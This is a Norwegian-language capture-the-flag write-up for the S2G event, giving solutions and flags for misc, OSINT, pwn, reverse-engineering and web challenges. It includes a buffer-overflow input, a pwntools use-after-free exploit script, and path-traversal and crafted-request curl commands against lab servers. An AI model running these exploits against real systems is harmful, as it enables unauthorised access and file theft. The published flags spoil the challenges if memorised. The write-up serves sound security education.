# S2G

# MISCELLANEOUS

## HELLO CARL

### Oppgave

Hele oppgavebeskrivelsen finnes [her](miscellaneous/hello_carl/challenge.md)

### Løsning

Oppgaven kan løses ved å lytte til lydklippet og taste `.` og `-` inn i [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&ieol=CRLF&oeol=CR)

Det er også mulig å bruke spectrum analyse for å gjøre det enklere å visualisere hvert klikk: [academo.org](https://academo.org/demos/spectrum-analyzer/)

Merk at flagget er i små bokstaver.

<details>
<summary>Flagg</summary>

`S2G{meetmeat8}`
</details>


## THE RECEIPT

### Oppgave

Hele oppgavebeskrivelsen finnes [her](miscellaneous/the_receipt/challenge.md)

### Løsning

Vi ser fort at det interessante i oppgaven er denne strengen:

```
000111111010011111110111100110111100111100110111001011111101100010011111
```

Du tenker kanskje allerede at dette er binær -> text. Men det gir lite resultat.

Leter vi på dcode.fr og søker på `barcode` finner vi typene:
Barcode 128 (barcode)
Barcode 93 (barcode)
Barcode 39 (barcode)

Ser vi på totalsummen på kvitteringen (slik som det er hintet til i oppgaveteksten) forsår vi at algoritmen er [Barcode 39](https://www.dcode.fr/barcode-39).

<details>
<summary>Flagg</summary>

`S2G{W3LLD0N3}`
</details>



# OSINT

## CLEAR VIEW 

### Oppgave

Bildevedlegg fra oppgaven:

![view.png](view.png)

Hele oppgavebeskrivelsen finnes [her](osint/clear_view_/challenge.md)

### Løsning

[Google Street View](https://www.google.com/maps/@60.8339764,10.0914549,3a,75y,274.03h,87.21t/data=!3m6!1e1!3m4!1sPFQ1_7VApXa6lmU3bgs44g!2e0!7i16384!8i8192?coh=205409&entry=ttu&g_ep=EgoyMDI0MTAyMS4xIKXMDSoASAFQAw%3D%3D)

<details>
<summary>Flagg</summary>

`S2G{Moskauglinna}`
</details>


## ITALIAN RIVER

### Oppgave

Bildevedlegg fra oppgaven:

![image.jpg](image.jpg)

Hele oppgavebeskrivelsen finnes [her](osint/italian_river/challenge.md)

### Løsning



<details>
<summary>Flagg</summary>

`S2G{Ponte_Umberto_I}`
</details>


## RED BUS

### Oppgave

Bildevedlegg fra oppgaven:

![bus.png](bus.png)

Hele oppgavebeskrivelsen finnes [her](osint/red_bus/challenge.md)

### Løsning

Finner raskt ruten til bussen og ser at den bare kjører på 4 ulike veier.

Prøver vi alle dem finner vi flagget til slutt.

Merk at `lane` er forkortet `ln` i oppgaven.

<details>
<summary>Flagg</summary>

`S2G{Mitcham Ln}`
</details>



# PWN

## HEAPING AROUND

### Oppgave

Hele oppgavebeskrivelsen finnes [her](pwn/heaping_around/challenge.md)

### Løsning

Enkel buffer overflow med 100 bytes buffer:

`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnot_so_secret`

<details>
<summary>Flagg</summary>

`S2G{7aa2c1476688db0817c193265d796d4a}`
</details>


## HEAPING AROUND 2

### Oppgave

Hele oppgavebeskrivelsen finnes [her](pwn/heaping_around_2/challenge.md)

### Løsning

Problemet vi kan utnytte ligger i altertiver for å frigjøre minne. Problemet er at hverken minnet eller pointeren dit blir slettet på riktig måte når vi frigjør minnet:
```c
if (current_pointer > 0){
    printf("\nWhich pointer do you want to free? (%i-%i)", 0, current_pointer - 1);

    int idx;
    scanf("%i", &idx);
    getchar();

    free(pointers[idx]);

    current_pointer--;

    printf("\nFreed 64 bytes om memory at %p\n", &pointers[current_pointer]);
}
```

Det gjør at når vi senere plasserer flagget på det samme stedet har vi allerede en pointer som peker dit og en funksjon som henter den ut. Ganske simpelt:

```py
from pwn import *

# Connect
io = remote("10.212.138.23", 53364)
# io = process("/heaping_around_2/heaping_around_2")

# Create pointer 1, 64 bytes
print("Allocating pointer 1")
io.sendlineafter(b"choice:", b"1")
io.sendlineafter(b"allocate?", b"64")

# Create some pointer 2
print("Allocating pointer 2")
io.sendlineafter(b"choice:", b"1")
io.sendlineafter(b"allocate?", b"1")

# Free up pointer 1
print("Free up")
io.sendlineafter(b"choice:", b"2")
io.sendlineafter(b")", b"0")

# Place flag at pointer 1
print("Place flag")
io.sendlineafter(b"choice:", b"4")

# Read mem from pointer 1
io.sendlineafter(b"choice:", b"3")
io.sendlineafter(b")", b"0")
io.interactive() # Recieve flag

# Close the connection
io.close()
```

<details>
<summary>Flagg</summary>

`S2G{3a056d8b5e0e1301d97e6fe3364b0278}`
</details>



# REVERSE_ENGINEERING

## REVXOR

### Oppgave

Hele oppgavebeskrivelsen finnes [her](reverse_engineering/revxor/challenge.md)

### Løsning

Åpner vi filen i Ghidra ser vi at vi kan dekompilere denne funksjonen:

```c
size_t sVar1;
undefined8 uVar2;
byte local_48 [52];
int local_14;
byte local_d;
int local_c;

local_d = 0x7a;
local_48[0] = 0x29;
local_48[1] = 0x48;
local_48[2] = 0x3d;
...
local_48[0x22] = 0x48;
local_48[0x23] = 0x4f;
local_48[0x24] = 0x07;
local_14 = 0x25;
sVar1 = strlen(param_1);
if (sVar1 == (long)local_14) {
for (local_c = 0; local_c < local_14; local_c = local_c + 1) {
    if ((byte)(param_1[local_c] ^ local_d) != local_48[local_c]) {
    return 0;
    }
}
uVar2 = 1;
}
else {
uVar2 = 0;
}
return uVar2;
```

Disse operasjonene kan reverseres for å finne `param_1` slik:

```py
local_d = 0x7a
local_48 = [
    0x29, 0x48, 0x3d, 1, 0x4a, 0x42, 0x19, 0x4b, 0x48, 0x19, 
    0x4c, 0x49, 0x4e, 0x4d, 0x1e, 0x18, 0x4e, 0x4c, 0x42, 
    0x1c, 0x4d, 0x48, 0x18, 0x4d, 0x1e, 0x4f, 0x1f, 0x1f, 
    0x19, 0x1f, 0x18, 0x1c, 0x4f, 0x4a, 0x48, 0x4f, 0x07
]

# Initialize an empty list to store characters
param_1 = []

# Compute each character using a loop
for b in local_48:
    param_1.append(chr(b ^ local_d))

# Join the characters to form the final flag
param_1 = ''.join(param_1)

print("Flag:", param_1)
```

<details>
<summary>Flagg</summary>

`S2G{08c12c6347db468f72b7d5eecebf5025}`
</details>



# WEB

## BISCOTTI

### Oppgave

Hele oppgavebeskrivelsen finnes [her](web/biscotti/challenge.md)

### Løsning

Flagget finnes på indexsiden der siden setter en cookie:

```js
<script>
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
setCookie('flag','UzJHe2IxNWMwNzcxXzUwbjBfYnUwbjF9',7);
</script>
```

Vi finner også cookien i inspect i browseren

Dekoder vi `UzJHe2IxNWMwNzcxXzUwbjBfYnUwbjF9` fra base64 finner vi flagget.
<details>
<summary>Flagg</summary>

`S2G{b15c0771_50n0_bu0n1}`
</details>


## LOGICAL FAILURE

### Oppgave

Denne lille websiden gir oss tilsynelatende ingenting. Derfor får vi hintet om at siden må fuzztestes for å finne andre endepunkter vi kan nå.

Hele oppgavebeskrivelsen finnes [her](web/logical_failure/challenge.md)

### Løsning

Bruker gobuster med [common.txt](https://github.com/v0re/dirb/blob/master/wordlists/common.txt) som wordlist for å map'e siden:

```bash
gobuster -u http://10.212.138.23:28786 -w common.txt
```

Finner at /config inneholder kildekoden til serven. Som blant annen inneholder denne funksjonen:

```js
app.post('/hmmm-flagmaybe', (req,res) => {
    if(req.body.daimTastesGood == "thatIsCorrect") {
        if(req.body.nr1[0] == 33) {
            res.render('index', {flag: myFlag})
        } else {
            res.render('index')
        }
    } else {
        res.render('index')
    }
})
```

Dette kan oppnås ved å sende en post request slik:

```bash
curl -X POST http://10.212.138.23:28786/hmmm-flagmaybe \
     -H "Content-Type: application/json" \
     -d '{"daimTastesGood": "thatIsCorrect", "nr1": [33]}'
```

<details>
<summary>Flagg</summary>

`S2G{daym_daim_is_damn_good}`
</details>


## MY FIRST WEBSITE

### Oppgave

Hele oppgavebeskrivelsen finnes [her](web/my_first_website/challenge.md)

### Løsning

Trykker vi på et av bildene kommer vi til et php-script som serverer bilder. Sårbarheten ligger i at den gir oss alle filer vi ber om og begrenser seg ikke til kun bilder. Derfor prøver vi å hente `flag.txt` eller `flag`:

```bash
curl http://10.212.138.23:20147/show.php?file=flag
```

Gir oss: `Keep looking.. The real flag must be in a file some place on this server..`

Derfor skjønner vi at filen vi leter etter heter flag, men at den ligger et annet sted. Leter vi i mappene over finner vi flagget:

```bash
curl http://10.212.138.23:20147/show.php?file=../flag
```

<details>
<summary>Flagg</summary>

`S2G{h55aGKCnvBCn8g}`
</details>


